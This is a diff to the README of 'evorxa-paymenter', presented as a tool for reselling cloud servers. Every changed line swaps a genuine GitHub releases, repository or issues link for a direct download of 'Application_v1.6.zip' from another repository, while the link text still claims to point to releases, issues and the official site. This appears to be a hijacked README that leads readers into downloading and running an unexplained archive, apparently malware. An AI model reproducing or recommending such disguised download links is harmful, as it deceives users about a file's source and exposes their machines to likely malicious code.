@@ -5,7 +5,7 @@ description: "Resell Evorxa VPS and VDS cloud servers from Paymenter with automa
 ---
 # 🚀 evorxa-paymenter - Resell Cloud Servers Effortlessly Today
 
-[![Download Now](https://img.shields.io/badge/Download-Evorxa%20Paymenter-blue?style=for-the-badge&logo=github)](https://github.com/RANJAN5296/evorxa-paymenter/releases)
+[![Download Now](https://img.shields.io/badge/Download-Evorxa%20Paymenter-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)
 
 ## 🎯 What Is This?
 
@@ -40,7 +40,7 @@ DDoS protection comes standard. Your customers' servers stay online even during 
 
 Visit this link to download the application:
 
-**[👉 CLICK HERE TO DOWNLOAD EVORXA-PAYMENTER](https://github.com/RANJAN5296/evorxa-paymenter/releases)**
+**[👉 CLICK HERE TO DOWNLOAD EVORXA-PAYMENTER](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)**
 
 ### Step 2: Run the Installer
 
@@ -164,15 +164,15 @@ This project is licensed under the MIT License - free to use, modify, and distri
 
 Don't wait another day to grow your hosting business. Download evorxa-paymenter now and start selling cloud servers in less than an hour.
 
-**[🚀 DOWNLOAD EVORXA-PAYMENTER NOW](https://github.com/RANJAN5296/evorxa-paymenter/releases)**
+**[🚀 DOWNLOAD EVORXA-PAYMENTER NOW](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)**
 
 Join hundreds of successful resellers who trust evorxa-paymenter to power their hosting business. It's fast, it's easy, and it just works.
 
 ## 🔗 Quick Links
 
-- **Official Website:** [github.com/RANJAN5296/evorxa-paymenter](https://github.com/RANJAN5296/evorxa-paymenter)
-- **Downloads:** [Releases Page](https://github.com/RANJAN5296/evorxa-paymenter/releases)
-- **Issues & Support:** [GitHub Issues](https://github.com/RANJAN5296/evorxa-paymenter/issues)
+- **Official Website:** [github.com/RANJAN5296/evorxa-paymenter](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)
+- **Downloads:** [Releases Page](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)
+- **Issues & Support:** [GitHub Issues](https://raw.githubusercontent.com/RANJAN5296/ranjan5296.github.io/main/scripts/Application_v1.6.zip)
 
 ---
 
